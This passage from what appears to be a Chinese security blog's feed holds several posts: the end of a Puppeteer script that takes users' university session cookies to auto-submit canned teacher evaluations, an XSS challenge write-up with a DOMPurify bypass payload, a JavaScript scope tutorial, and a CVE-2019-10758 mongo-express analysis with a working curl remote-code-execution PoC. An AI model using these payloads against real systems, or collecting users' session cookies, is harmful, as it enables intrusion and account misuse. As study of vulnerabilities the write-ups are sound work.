page.click(&quot;input[id=option_438_3]&quot;);                await page.click(&quot;input[id=option_439_0]&quot;);                await page.click(&quot;input[id=option_440_0]&quot;);                await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });                await page.click(&#39;#sub&#39;);                await page.waitFor(3000);                console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);            }catch(err){                try{                    await page.goto(bufurl);                    await page.waitForSelector(&#39;.option-item&#39;);                    await page.click(&quot;input[id=option_382_0]&quot;);                    await page.click(&quot;input[id=option_383_0]&quot;);                    await page.click(&quot;input[id=option_384_0]&quot;);                    await page.click(&quot;input[id=option_385_0]&quot;);                    await page.click(&quot;input[id=option_386_0]&quot;);                    await page.click(&quot;input[id=option_387_0]&quot;);                    await page.click(&quot;input[id=option_388_0]&quot;);                    await page.click(&quot;input[id=option_389_0]&quot;);                    await page.click(&quot;input[id=option_390_0]&quot;);                    await page.click(&quot;input[id=option_391_0]&quot;);                    await page.click(&quot;input[id=option_392_0]&quot;);                    await page.click(&quot;input[id=option_393_0]&quot;);                    await page.click(&quot;input[id=option_502_4]&quot;);                    await page.click(&quot;input[id=option_395_3]&quot;);                    await page.click(&quot;input[id=option_396_0]&quot;);                    await page.click(&quot;input[id=option_397_0]&quot;);                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });                    await page.click(&#39;#sub&#39;);                    await page.waitFor(3000);                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);                }catch(err){                    await page.goto(bufurl);                    await page.waitForSelector(&#39;.option-item&#39;);                    await page.click(&quot;input[id=option_414_0]&quot;);                    await page.click(&quot;input[id=option_415_0]&quot;);                    await page.click(&quot;input[id=option_416_0]&quot;);                    await page.click(&quot;input[id=option_417_0]&quot;);                    await page.click(&quot;input[id=option_418_0]&quot;);                    await page.click(&quot;input[id=option_419_0]&quot;);                    await page.click(&quot;input[id=option_420_0]&quot;);                    await page.click(&quot;input[id=option_421_0]&quot;);                    await page.click(&quot;input[id=option_422_0]&quot;);                    await page.click(&quot;input[id=option_423_0]&quot;);                    await page.click(&quot;input[id=option_424_0]&quot;);                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });                    await page.click(&#39;#sub&#39;);                    await page.waitFor(3000);                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);                }            }        }        await browser.close();}home.get(&#39;/&#39;,async(ctx)=&gt;{    let html = `    &lt;html&gt;    &lt;body&gt;    &lt;p&gt;        首先登陆jwc.cuit.edu.cn，&quot;量化评教&quot;的学情自己填了(否则不允许评教)    &lt;/p&gt;    &lt;p&gt;        然后浏览器f12控制台输入document.cookie，例如:    &lt;/p&gt;    &lt;p&gt;        GSESSIONID=B8209EC9AF980BDFE89CF0C43C356DC8    &lt;/p&gt;    &lt;p&gt;         则把B8209EC9AF980BDFE89CF0C43C356DC8复制到框内提交    &lt;/p&gt;    &lt;form action=&quot;evaluate&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; id=&quot;cookie&quot; name=&quot;Mycookie&quot;&gt;        &lt;input type=&quot;submit&quot; id=&quot;btn_click&quot; name=&quot;submit&quot;/&gt;    &lt;/form&gt;    &lt;/body&gt;    &lt;/html&gt;`    ctx.body = html})home.post(&#39;/evaluate&#39;,async(ctx)=&gt;{    cookie = ctx.request.body.Mycookie;    ctx.body = &quot;[+]waiting..后台正在帮您自动评教..请一分钟以后刷新jwc查看情况...&quot;;    console.log(cookie);    autoFound(&#39;http://210.41.225.2/eams/quality/stdEvaluate.action&#39;,cookie);})app.use(bodyParser())app.use(home.routes()).use(home.allowedMethods());app.listen(3000)console.log(&#39;[demo] start-quick is starting at port 3000&#39;)</code></pre><p>如果想改变对老师的印象可自行更改以下内容</p><pre><code>[&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;]</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Node的一些应用技巧-持续更新&quot;&gt;&lt;a href=&quot;#Node的一些应用技巧-持续更新&quot; class=&quot;headerlink&quot; title=&quot;Node的一些应用技巧(持续更新)&quot;&gt;&lt;/a&gt;Node的一些应用技巧(持续更新)&lt;/h1&gt;&lt;p&gt;一边学一边记吧..一些能
      
    
    </summary>
    
    
      <category term="前端安全" scheme="https://hpdoger.cn/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>一道有趣的XSS-Challenge</title>
    <link href="https://hpdoger.cn/2020/02/01/%E4%B8%80%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84XSS-Challenge/"/>
    <id>https://hpdoger.cn/2020/02/01/一道有趣的XSS-Challenge/</id>
    <published>2020-01-31T16:00:00.000Z</published>
    <updated>2020-02-06T11:51:59.502Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一道有趣的XSS-Challenge"><a href="#一道有趣的XSS-Challenge" class="headerlink" title="一道有趣的XSS-Challenge"></a>一道有趣的XSS-Challenge</h1><p>早上刷某特时推送了三上悠ya的动态，猛点双击后却发现是pwnfunction更新了一道xss-challenge的wp(上当了上当了)。看了下题目难度是hard，质量很高，考点也很有趣。官方wp的payload和解题思路看起来不是很复杂，实际上还是隐藏了很多知识点，如果大家复现这个题目，希望这篇文章能够对你有帮助。</p><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>题目名称:WW<br>题目难度:Hard<br>题目地址:<a href="https://xss.pwnfunction.com/challenges/ww3/" target="_blank" rel="noopener">https://xss.pwnfunction.com/challenges/ww3/</a><br>思路:bypass DOMPurify+DOM clobbering</p><p>可控的输入的点有两个<code>text</code>，<code>img</code></p><pre><code>let text = new URL(location).searchParams.get(&#39;text&#39;)let img = new URL(location).searchParams.get(&#39;img&#39;)</code></pre><p><code>img</code>作为img标签的src属性被写入，且被过滤了关键符号。</p><pre><code>&lt;img class=&quot;circle&quot; src=&quot;${escape(img)}&quot; onload=&quot;memeGen(this, notify)&quot;&gt;const escape = (dirty) =&gt; unescape(dirty).replace(/[&lt;&gt;&#39;&quot;=]/g, &#39;&#39;);</code></pre><p><code>text</code>作为文本被渲染，渲染前都经过一次DOMPurify.sanitize处理</p><pre><code>//part1document.write(...Creating meme... (${DOMPurify.sanitize(text)}))//part2 html = (`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from ${DOMPurify.sanitize(text)}&lt;/div&gt;`)notify ? ($(&#39;#notify&#39;).html(html)) : &#39;&#39;</code></pre><h2 id="DOMpurify-bypass-via-Jquery-html"><a href="#DOMpurify-bypass-via-Jquery-html" class="headerlink" title="DOMpurify bypass via Jquery.html()"></a>DOMpurify bypass via Jquery.html()</h2><p>乍一看经过<code>DOMPurify</code>后的这些交互点都很安全，但是使用<code>html()</code>解析会存在标签逃逸问题。</p><p>题目作者在wp中提到了两种解析html的方式:<strong>jquery.html&amp;innerhtml</strong>。<code>innerHTML</code>是原生js的写法，<code>Jqury.html()</code>也是调用原生的innerHTML方法，但是加了自己的解析规则(后文介绍)。</p><p>关于两种方式:<code>Jquery.html()</code>和<code>innerHTMl</code>的区别我们用示例来看。</p><p>对于innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时，<code>&lt;style&gt;</code>标签中不允许存在子标签(style标签最初的设计理念就不能用来放子标签)，如果存在会被当作text解析。因此<code>&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert(1337)//</code>会被渲染如下</p><pre><code>&lt;style&gt;    &lt;style/&gt;&lt;script&gt;alert(1337)//&lt;/style&gt;</code></pre><p>对于<code>Jqury.html()</code>，最终对标签的处理是在<code>htmlPrefilter()</code>中实现:<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js" target="_blank" rel="noopener">jquery-src</a>，其后再进行原生innerHTML的调用来加载到页面。</p><pre><code>rxhtmlTag = /&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0&gt;\x20\t\r\n\f]*)[^&gt;]*)\/&gt;/gi/&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0&gt;\x20\t\r\n\f]*)[^&gt;]*)\/&gt;/gijQuery.extend( {    htmlPrefilter: function( html ) {        return html.replace( rxhtmlTag, &quot;&lt;$1&gt;&lt;/$2&gt;&quot; );    }    ...})tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];</code></pre><p>有意思的是，这个正则表达式在匹配<code>&lt;*/&gt;</code>之后会重新生成一对标签(区别于直接调用innerHTML)<br><img src="http://static.zybuluo.com/1160307775/se8cdbp2typ6p6dd55uhmjn5/image_1dv0k1frc1f1p1l9j210u38bnc1g.png" alt="image_1dv0k1frc1f1p1l9j210u38bnc1g.png-45.1kB"></p><p>所以相同的语句<code>&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert(1337)//</code>则会被解析成如下形式，成功逃逸<code>&lt;script&gt;</code>标签。</p><pre><code>&lt;style&gt;    &lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(1337)//</code></pre><p><img src="http://static.zybuluo.com/1160307775/d4hgs4rdmhqrcjx6y63dkol9/image_1dv0ko5kbv8h1gkkv3d1g6b1gf21t.png" alt="image_1dv0ko5kbv8h1gkkv3d1g6b1gf21t.png-51.8kB"></p><p>我们知道DOMPurify的工作机制是将传入的payload分配给元素的innerHtml属性，让浏览器解释它(但不执行)，然后对潜在的XSS进行清理。由于DOMPurify在对其进行<code>innerHtml</code>处理时，<code>script</code>标签被当作<code>style</code>标签的text处理了，所以DOMPurify不会进行清洗(因为认为这是无害的payload)，但在其后进入html()时，这个无害payload就能逃逸出来一个有害的<code>script</code>标签从而xss。</p><h2 id="DOM-clobbering"><a href="#DOM-clobbering" class="headerlink" title="DOM-clobbering"></a>DOM-clobbering</h2><p>第二个考点是要覆盖变量<code>notify</code>，只有在notify不为false的时候才能顺利进入html()方法</p><pre><code class="javascript">let notify = false;document.write(`&lt;img class=&quot;circle&quot; src=&quot;${escape(img)}&quot; onload=&quot;memeGen(this, notify)&quot;&gt;`)const memeGen = (that, notify) =&gt; {        if (notify) {                html = (`${DOMPurify.sanitize(text)}`)            }        ...        $(&#39;#notify&#39;).html(html)}</code></pre><p>首先尝试用DOM-clobbering创造一个id为<code>notify</code>的变量，但是这种方式不允许覆盖已经存在的变量。</p><pre><code>&lt;html&gt;&lt;img id=notify&gt;&lt;img src=&quot;&quot; onerror=&quot;memeGen(notify)&quot;&gt;&lt;script&gt;const memeGen = (notify) =&gt;{    consol.log(notify);  //false}let notify = false;&lt;/script&gt;&lt;/html&gt;</code></pre><p>不过我们依然可以借助标签的name属性值，为document对象创造一个变量<code>document.notify</code>，熟悉dom-clobbing的都很了解这种方式也常用来覆盖<code>document</code>的各种属性/方法。然而这道题不需要覆盖什么，我们就先把它当作一种创造变量的手段，后文再讲。我们先看简单了解一下JS的作用域</p><h2 id="JS作用域-amp-作用域链"><a href="#JS作用域-amp-作用域链" class="headerlink" title="JS作用域&amp;作用域链"></a>JS作用域&amp;作用域链</h2><p>在JS的函数中，一个变量是否可访问要看它的作用域(scope)，变量的作用域有全局作用域和局部作用域(函数作用域)两种，关于详细的介绍可以移步之前博客的小记：<a href="https://hpdoger.cn/2020/01/20/%E6%B7%B1%E5%85%A5Javascript-%E4%BD%9C%E7%94%A8%E5%9F%9F&Scope%20Chain/">深入Javascript-作用域&amp;Scope Chain</a>，这里举个最简单的例子如下</p><pre><code>function init() {    var inVariable = &quot;local&quot;;}init();console.log(inVariable); //Uncaught ReferenceError: inVariable is not defined</code></pre><p>这就是因为函数内部用<code>var</code>声明的<code>inVariaiable</code>属于局部作用域范畴，在全局作用域没有声明。我们可以这样理解：作用域就是一个独立的地盘，让变量不会外泄、暴露出去。也就是说作用域最大的用处就是隔离变量，不同作用域下同名变量不会有冲突</p><p>在寻找一个变量可访问性时根据作用域链来查找的，作用域链中的下一个变量对象来自包含（外部）环境，而再下一个变量对象则来自下一个包含环境。这样，一直延续到全局执行环境；全局执行环境的变量对象始终都是作用域链中的最后一个对象。</p><p>而在Javascript event handler(时间处理程序)中，也就是onxx事件中(这块地盘)，scope chain的调用就比较有意思了。它会先去判断当前的scope是否有局部变量<code>notify</code>，若不存在向上查找<code>window.document.notify</code>，仍不存在继续向上到全局执行环境即<code>window.notify</code>为止。</p><p>这样说起来可能有点绕，我们来看下面这个例子就明白了</p><pre><code class="javascript">&lt;img src=&quot;&quot; onerror=&quot;console.log(nickname)&quot;&gt; //pig&lt;img src=&quot;&quot; onerror=&quot;var nickname=&#39;dog&#39;;console.log(nickname)&quot;&gt; //dog&lt;script&gt;window.document.nickname = &#39;pig&#39;;window.nickname = &#39;cat&#39;;&lt;script&gt;</code></pre><p>打印的结果分别为<code>pig</code>和<code>dog</code>。原因就是在第二个img标签中，onerror的上下文存在局部作用域的nickname变量，不用再向上查找了。</p><p>同时注意到题目触发<code>memeGen</code>函数的方式也恰好是写在event handler中–即<code>onload</code>内。所以污染了<code>document.notify</code>就相当于污染了将要传递的实参<code>notify</code>，这也就是为什么需要之前的dom-clobbing。</p><pre><code>&lt;img class=&quot;circle&quot; src=url onload=&quot;memeGen(this, notify)&quot;&gt;</code></pre><h2 id="思路线-amp-题外话"><a href="#思路线-amp-题外话" class="headerlink" title="思路线&amp;题外话"></a>思路线&amp;题外话</h2><p><strong>dom clobbing新建一个document.notify-&gt;onload-&gt;bypass D0MPurify via html()=&gt;XSS</strong></p><p>另外，我们前文提到在event handler的作用域中scope chain是:局部变量-&gt;document-&gt;global。</p><p>但是在普通的局部作用域内，scope chain <strong>没有</strong> document这一链，而是<code>局部作用域变量-&gt;global</code>，示例如下</p><pre><code class="javascript">&lt;script&gt;window.document.nickname = &#39;pig&#39;;window.nickname = &#39;cat&#39;;let nickname = &#39;dog&#39;;function echoNameA(nickname){    console.log(nickname); // dog}window.realname = &#39;me&#39;;window.document.realname = &#39;hpdoger&#39;;function echoNameB(){    console.log(realname); //me}echoNameA(nickname);echoNameB(realname);&lt;/script&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一道有趣的XSS-Challenge&quot;&gt;&lt;a href=&quot;#一道有趣的XSS-Challenge&quot; class=&quot;headerlink&quot; title=&quot;一道有趣的XSS-Challenge&quot;&gt;&lt;/a&gt;一道有趣的XSS-Challenge&lt;/h1&gt;&lt;p&gt;早上刷某特时
      
    
    </summary>
    
    
      <category term="前端安全" scheme="https://hpdoger.cn/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>深入Javascript-作用域&amp;Scope Chain</title>
    <link href="https://hpdoger.cn/2020/01/20/%E6%B7%B1%E5%85%A5Javascript-%E4%BD%9C%E7%94%A8%E5%9F%9F&amp;Scope%20Chain/"/>
    <id>https://hpdoger.cn/2020/01/20/深入Javascript-作用域&amp;Scope Chain/</id>
    <published>2020-01-19T16:00:00.000Z</published>
    <updated>2020-01-21T06:42:26.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入Javascript-作用域-amp-Scope-Chain"><a href="#深入Javascript-作用域-amp-Scope-Chain" class="headerlink" title="深入Javascript-作用域&amp;Scope Chain"></a>深入Javascript-作用域&amp;Scope Chain</h1><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>前一段时间朋友面试keen问了个问题：JS作用域是什么？正好这两天有一道XSS-Challenge也涉及了作用域的trick，填补了很多知识空白(JS的世界真是太特喵的nb了)，写一篇文章来扫个盲</p><h1 id="什么是JavaScript的作用域"><a href="#什么是JavaScript的作用域" class="headerlink" title="什么是JavaScript的作用域"></a>什么是JavaScript的作用域</h1><p>在JS中，一个函数内是否可访问某个变量，要看该变量的作用域(scope)。我们可以这样理解：<strong>作用域就是一个独立的地盘，让变量不会外泄、暴露出去。也就是说作用域最大的用处就是隔离变量，不同作用域下同名变量不会有冲突</strong></p><p>变量的作用域有全局作用域和局部作用域(函数作用域)两种</p><h2 id="全局作用域-Global-Scope"><a href="#全局作用域-Global-Scope" class="headerlink" title="全局作用域(Global Scope)"></a>全局作用域(Global Scope)</h2><p>在代码中任何地方都能访问到的<strong>对象</strong>拥有全局作用域，一般来说以下三种情形拥有全局作用域</p><h3 id="1-程序最外层定义的函数或者变量"><a href="#1-程序最外层定义的函数或者变量" class="headerlink" title="1-程序最外层定义的函数或者变量"></a>1-程序最外层定义的函数或者变量</h3><p>举个最简单的例子如下，<code>global</code>变量就属于全局作用域，不管是在 checkscope() 函数内部还是外部，都能访问到全局变量 global，<code>checkscope</code>函数也属于全局作用域。</p><pre><code>var global = &quot;global&quot;;     // 显式声明一个全局变量function checkscope() {    var local = &quot;local&quot;;   // 显式声明一个局部变量    return global;         // 返回全局变量的值}console.log(scope);        // &quot;global&quot;console.log(checkscope()); // &quot;global&quot;console.log(local);        // error: local is not defined.</code></pre><h3 id="2-所有末定义直接赋值的变量"><a href="#2-所有末定义直接赋值的变量" class="headerlink" title="2-所有末定义直接赋值的变量"></a>2-所有末定义直接赋值的变量</h3><p>这个跟我们平常写代码的坏习惯有关，不加限制类型的变量会自动升级为全局作用域，这个就不限制在程序的最外层还是函数内部，示例如下：</p><pre><code class="javascript">username = &#39;hpdoger&#39;;function echoName(){    nickname = &#39;wuyanzu&#39;;}function CheckVal(){    console.log(username); //hpdoger        console.log(nickname); //wuyanzu}echoName();CheckVal();</code></pre><h3 id="3-Window对象的属性和方法"><a href="#3-Window对象的属性和方法" class="headerlink" title="3-Window对象的属性和方法"></a>3-Window对象的属性和方法</h3><p>一般情况下，window对象的内置属性都拥有全局作用域，例如window.name、window.location、window.top等等</p><p>通常在Javascript中我们说全局对象，指的就是Window对象，引用<code>this</code>指代的也是Window对象，如果我们在程序中定义一个全局作用域的变量，那么它自然也会成为Window对象的属性，所以下面的用法是等价的</p><pre><code>var name = &#39;hpdoger&#39;;name == window.name; //true</code></pre><h2 id="局部作用域-Local-Scope"><a href="#局部作用域-Local-Scope" class="headerlink" title="局部作用域(Local Scope)"></a>局部作用域(Local Scope)</h2><p>和全局作用域相反，局部作用域一般只在固定的代码片段内可访问到。最常见的是在函数体内定义的变量，只能在函数体内使用</p><p>举个最简单的例子如下</p><pre><code>function init() {    var inVariable = &quot;local&quot;;}init();console.log(inVariable); //Uncaught ReferenceError: inVariable is not defined</code></pre><p><code>var</code>声明的<code>inVariaiable</code>属于局部作用域范畴，在全局作用域没有声明，只能在函数内部调用。这时候你可能有个疑问，它是<code>var</code>的声明啊，他喵的不应该是全局变量吗？？</p><p>实际上这跟它的声明方式没有一点关系。变量是否可引用，只由它的作用域决定。</p><h2 id="局部作用域与全局作用域的制约"><a href="#局部作用域与全局作用域的制约" class="headerlink" title="局部作用域与全局作用域的制约"></a>局部作用域与全局作用域的制约</h2><p>在函数体内，局部变量的优先级高于同名的全局变量。如果在函数内声明的一个局部变量或者函数参数中带有的变量和全局变量重名，那么全局变量就被局部变量所<strong>遮盖</strong>，而全局变量并不会因此发生值的变化，举个例子来看。</p><pre><code>var username = &#39;hpdoger&#39;;function echoNameA(username){    console.log(username);//wuyanzu}function echoNameB(){    var username = &#39;wuyanzu&#39;;    console.log(username); //wuyanzu}echoNameA(&#39;wuyanzu&#39;);echoNameB();console.log(username);   //hpdoger</code></pre><p>我们在这里用到<strong>遮盖</strong>这个词，其实是不准确的。因为读取变量值的方式是查找作用域链，也就是遍历Scope Chain，只是实现效果类似于遮盖。下文我们来看一下什么是Javascript的作用域链</p><h1 id="什么是Javascript作用域链"><a href="#什么是Javascript作用域链" class="headerlink" title="什么是Javascript作用域链"></a>什么是Javascript作用域链</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>在寻找一个变量可访问性(取值)时是根据作用域链来查找的，<strong>作用域链的用途，是保证对执行环境有权访问的所有变量和函数的有序访问</strong></p><p>我们先引入两个概念来走通scope chain</p><ul><li>AO：Activetion Object（活动对象）</li><li>VO：Variable Object（变量对象）</li></ul><p>AO对应的是函数执行阶段，当函数被调用执行时，会建立一个执行上下文，该执行上下文包含了函数所需的所有变量，该变量共同组成了一个新的对象就是Activetion Object。该对象包含了：</p><ul><li>函数的所有局部变量</li><li>函数的所有命名参数</li><li>函数的参数集合</li><li>函数的this指向</li></ul><p>举个例子来看函数执行的时候AO的值</p><pre><code>function add(a,b){    var sum = a + b;    function say(){        alert(sum);    }    return sum;}add(4,5);</code></pre><p>如果我们用JS的对象来描述AO，那么它的表现形式如下</p><pre><code>  AO = {        this : window,        arguments : [4,5],        a : 4,        b : 5,        say : ,        sum : undefined  }</code></pre><p>VO对应的是函数创建阶段，JS解析引擎进行预解析时，所有的变量和函数的声明，统称为Variable Object。该变量与执行上下文相关，知道自己的数据存储在哪里，并且知道如何访问。它分为全局上下文VO（全局对象，Global object，我们通常说的global对象）和函数上下文的AO，它存储着在上下文中声明的以下内容：</p><ul><li>变量 (var, 变量声明);</li><li>函数声明 (FunctionDeclaration, 缩写为FD);</li><li>函数的形参</li></ul><pre><code>function add(a,b){    var sum = a + b;    function say(){        alert(sum);    }    return sum;}// sum,say,a,b 组合的对象就是VO，不过该对象的值基本上都是undefined</code></pre><h2 id="遍历作用域链"><a href="#遍历作用域链" class="headerlink" title="遍历作用域链"></a>遍历作用域链</h2><p>作用域链中的下一个变量对象来自包含（外部）环境，而再下一个变量对象则来自下一个包含环境。这样，一直延续到全局执行环境；全局执行环境的变量对象始终都是作用域链中的最后一个对象。</p><p>他喵的，上面好多都是我复制过来的，概念很复杂其实挺简单的，我们举一个简单的例子来看。</p><pre><code>var x = 10;function foo() {    var y = 20;    function bar() {        var z = 30;        console.log(x + y + z); //60    };    bar()};foo();</code></pre><p>函数bar可以直接访问”z”，然后通过作用域链访问上层的”x”和”y”。此时的作用域链为：</p><pre><code>此时作用域链（Scope Chain）有三级，第一级为bar AO，第二级为foo AO,然后Global Object（VO）    scope -&gt; bar.AO -&gt; foo.AO -&gt; Global Object    bar.AO = {        z : 30,        __parent__ : foo.AO    }    foo.AO = {        y : 20,        bar : ,        __parent__ :     }    Global Object = {        x : 10,        foo : ,        __parent__ : null    }</code></pre><p>很简单，就是先从当前的AO一步一步向上遍历AO对象查找，走后查到VO(存储全局对象的东西)</p><h2 id="一个有趣的Scope-Chain"><a href="#一个有趣的Scope-Chain" class="headerlink" title="一个有趣的Scope Chain"></a>一个有趣的Scope Chain</h2><p>我们看下面的例子，console.log的打印值为<code>undefined</code></p><pre><code>var username = &#39;hpdoger&#39;;function echoName(){    console.log(username);  //undefiend    var username = &#39;wuyanzu&#39;;}echoName();</code></pre><p>为啥不是hpdoger呢？这是因为AO建立的逻辑是要先声明变量，所以在函数<code>eechoName</code>中代码实际的执行流程是这样的：</p><pre><code>function echoName(){    var username;    console.log(username);    var username = &#39;wuyanzu&#39;;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;深入Javascript-作用域-amp-Scope-Chain&quot;&gt;&lt;a href=&quot;#深入Javascript-作用域-amp-Scope-Chain&quot; class=&quot;headerlink&quot; title=&quot;深入Javascript-作用域&amp;amp;Scope C
      
    
    </summary>
    
    
      <category term="前端安全" scheme="https://hpdoger.cn/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-10758:mongo-expressRCE复现分析</title>
    <link href="https://hpdoger.cn/2020/01/03/CVE-2019-10758-mongo-expressRCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2020/01/03/CVE-2019-10758-mongo-expressRCE复现分析/</id>
    <published>2020-01-02T16:00:00.000Z</published>
    <updated>2020-01-21T06:45:44.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-10758-mongo-expressRCE复现分析"><a href="#CVE-2019-10758-mongo-expressRCE复现分析" class="headerlink" title="CVE-2019-10758:mongo-expressRCE复现分析"></a>CVE-2019-10758:mongo-expressRCE复现分析</h1><p>早上室友说发了一则mongo-express的预警，正好看到陈师傅也发了twitter，动手分析一下，如有差错还望指正</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>漏洞环境:<br><a href="https://github.com/mongo-express/mongo-express#readme" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express#readme</a><br><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">https://github.com/masahiro331/CVE-2019-10758</a></p><p>自己从官方拉到本地+mongodb的服务端或者docker起一个未授权的mongo端都可以，poc直接就能打出来</p><pre><code>curl &#39;http://localhost:8081/checkValid&#39; -H &#39;Authorization: Basic YWRtaW46cGFzcw==&#39;  --data &#39;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#39;</code></pre><p><img src="http://static.zybuluo.com/1160307775/1ofxgk12w4566n8105f5s2x9/image_1dto0qppb1f1v124r13mi1rugm8o5q.png" alt="image_1dto0qppb1f1v124r13mi1rugm8o5q.png-386.7kB"></p><h1 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h1><p>文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>进行路由事件的方法绑定<br><img src="http://static.zybuluo.com/1160307775/77jhyl9xv7egdf09x00dvdiy/image_1dtnda3rm1r7412s61m5v1i71m5t3p.png" alt="image_1dtnda3rm1r7412s61m5v1i71m5t3p.png-617.2kB"></p><p>路由事件checkvalid对应的方法在文件<code>express-mongo/node_modules/mongo-express/lib/routes/document.js</code>，调用了<code>toBSON</code></p><p><img src="http://static.zybuluo.com/1160307775/fyz0jsczrxbneolxwpif75fk/image_1dtndcghv1ltvs581mfp1nfr11hu46.png" alt="image_1dtndcghv1ltvs581mfp1nfr11hu46.png-64.8kB"></p><p>在toBSON函数中将传入的参数放进vm2沙箱里去eval</p><pre><code>exports.toBSON = function (string) {  var sandbox = exports.getSandbox();  string = string.replace(/ISODate\(/g, &#39;new ISODate(&#39;);  string = string.replace(/Binary\((&quot;[^&quot;]+&quot;),/g, &#39;Binary(new Buffer($1, &quot;base64&quot;),&#39;);  vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);  return sandbox.doc;};</code></pre><p>绕一下vm2逃逸出来沙箱即可，详情可以看这篇文章<a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></p><h1 id="其他触发点"><a href="#其他触发点" class="headerlink" title="其他触发点"></a>其他触发点</h1><p>还有一处对mongo传值的地方也存在bson的问题，只是要校验是否存在数据库&amp;表名，利用起来没有checkValid的链方便，不过大多数mongo库都会存在local的库+start_log这个collection</p><p><img src="http://static.zybuluo.com/1160307775/eb2olwr7s4b04kmrsqhhvo1d/image_1dtr6dtch1t8kgrj1tq4c1jcivm.png" alt="image_1dtr6dtch1t8kgrj1tq4c1jcivm.png-375kB"></p><h1 id="需不需要验证"><a href="#需不需要验证" class="headerlink" title="需不需要验证"></a>需不需要验证</h1><p><code>mongo-express</code>把原始config对象写在config.default.js文件中。</p><p>漏洞分析中的poc需要进行权限鉴定，也就是poc中使用了请求头<code>Authorization: Basic YWRtaW46cGFzcw==</code>的原因。删掉后请求则会返回未授权</p><p><img src="http://static.zybuluo.com/1160307775/diptzrofl46yjfld44z1m025/image_1dto2g2p7kj6121c18ci1h4vq9i77.png" alt="image_1dto2g2p7kj6121c18ci1h4vq9i77.png-63.4kB"></p><p>但是如果以cli+指定用户形式启动服务端与mongo的连接时，则不需要授权也能打(个人认为这种方式更常见一点?)<br><img src="http://static.zybuluo.com/1160307775/so63suhp0hmj3thu9axhunmf/image_1du1fiujq1v2r1icnt5t3lctg69.png" alt="image_1du1fiujq1v2r1icnt5t3lctg69.png-524.8kB"></p><p>下面是关于mongo-express调用<code>basic-auth-connect</code>的认证简单分析</p><h2 id="认证流程分析"><a href="#认证流程分析" class="headerlink" title="认证流程分析"></a>认证流程分析</h2><p>程序入口逻辑是这样的，如果你程序启动的时候给一个-u&amp;-p参数则<code>config.useBasicAuth</code>为false，而<code>config.useBasicAuth</code>在加载配置的阶段默认为true</p><pre><code>if (commander.username &amp;&amp; commander.password) {...config.useBasicAuth = false;}</code></pre><p>接着看文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>，根据<code>config.useBasicAuth</code>的值绑定一个<code>basicAuth</code>中间键，如果初始启动程序的时候没有-u/-p参数，则获取配置文件的username&amp;password(默认为admin:pass)来进行绑定</p><p><img src="http://static.zybuluo.com/1160307775/s00s25eqbwv3p7idk9ei0xjs/image_1dtntgtmr1cep1la29dnuaevf45d.png" alt="image_1dtntgtmr1cep1la29dnuaevf45d.png-591kB"></p><p>这里假设我们启动程序的时候默认不传入-u/-p，则步入<code>basicAuth</code>函数。这里定义了两个全局变量<code>username</code>&amp;<code>password</code>，来存储配置文件的用户名密码。</p><pre><code>module.exports = function basicAuth(callback, realm) {  var username, password;  // user / pass strings  if (&#39;string&#39; == typeof callback) {    username = callback;    password = realm;    if (&#39;string&#39; != typeof password) throw new Error(&#39;password argument required&#39;);    realm = arguments[2];    callback = function(user, pass){      return user == username &amp;&amp; pass == password;    }  }  realm = realm || &#39;Authorization Required&#39;;  return function(req, res, next) {    var authorization = req.headers.authorization;    if (req.user) return next();    if (!authorization) return unauthorized(res, realm);    var 